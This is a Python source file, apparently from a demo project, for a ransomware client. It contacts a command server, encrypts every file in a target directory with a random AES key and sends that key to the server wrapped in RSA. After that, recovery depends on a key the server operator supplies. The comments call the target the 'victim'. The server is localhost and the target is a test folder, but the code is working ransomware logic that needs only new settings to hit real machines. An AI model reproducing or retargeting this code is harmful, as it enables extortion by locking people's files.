import socket, json, os, struct, uuid, base64
import AesAlgorithm
import RSA_algorithm


#setup configure for victim
SERVER_IP = "127.0.0.1"
SERVER_PORT = 6967
TARGET_DIR = "/home/k4k/vscode/safe-ransomware-crypto-demo/src/testing_env"
CLIENT_ID_FILE = ".client_uuid"

#generate/get uuid
def get_or_create_uuid():
    if os.path.exists(CLIENT_ID_FILE):
        with open(CLIENT_ID_FILE, "r") as f:
            return f.read().strip()

    cid = str(uuid.uuid4())
    with open(CLIENT_ID_FILE, "w") as f:
        f.write(cid)
    return cid
CLIENT_UUID = get_or_create_uuid()


#json send/recv utils
def recv_exact(sock, n):
    data = b""
    while len(data) < n:
        chunk = sock.recv(n - len(data))
        if not chunk:
            raise ConnectionError("Connection closed")
        data += chunk
    return data

def send_json(sock, payload):
    data = json.dumps(payload).encode()
    sock.sendall(struct.pack("!I", len(data)) + data)

def recv_json(sock):
    raw_len = recv_exact(sock, 4)
    msg_len = struct.unpack("!I", raw_len)[0]
    return json.loads(recv_exact(sock, msg_len).decode())


#encryption flow
def register_and_encrypt():

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((SERVER_IP, SERVER_PORT))

        send_json(s, {
            "client_id": CLIENT_UUID,
            "action": "request_encryption"
        })

        response = recv_json(s)

        if response.get("status") != "ALLOW":
            return False

        server_public_pem = response["public_key"]

    #encrypt files in target dir
    aes_key = bytearray(os.urandom(32))
    AesAlgorithm.encrypt_directory(TARGET_DIR, aes_key)

    #use public key to encrypt aes key
    server_public_key = RSA_algorithm.load_public_key(
        server_public_pem.encode()
    )

    encrypted_aes_key = RSA_algorithm.encryption_rsa(
        server_public_key,
        bytes(aes_key)
    )

    encrypted_aes_key_b64 = base64.b64encode(encrypted_aes_key).decode()

    #send the encrypted aes key to server
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((SERVER_IP, SERVER_PORT))

        send_json(s, {
            "client_id": CLIENT_UUID,
            "action": "submit_key",
            "encrypted_aes_key": encrypted_aes_key_b64
        })

        recv_json(s)

    #wipe aes key from memory
    for i in range(len(aes_key)):
        aes_key[i] = 0
    del aes_key

    return True

#decryption flow but need the input key (hex string)
def decrypt_with_key(hex_key):
    """decrypt files in dir and notify server back to delete record"""
    aes_key = bytes.fromhex(hex_key)
    AesAlgorithm.decrypt_directory(TARGET_DIR, aes_key)

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((SERVER_IP, SERVER_PORT))

        send_json(s, {
            "client_id": CLIENT_UUID,
            "action": "decrypt_done"
        })

        recv_json(s)


#for testing purpose
if __name__ == "__main__":
    print("testing mode for client.py")
  
    ok = register_and_encrypt()
    if not ok:
        print("**Already encrypted**")
        exit(0)

    print("\n!!! Enter AES key shown on SERVER terminal")
    key = input("> ").strip()
    decrypt_with_key(key)

    print("[+] files decrypted")
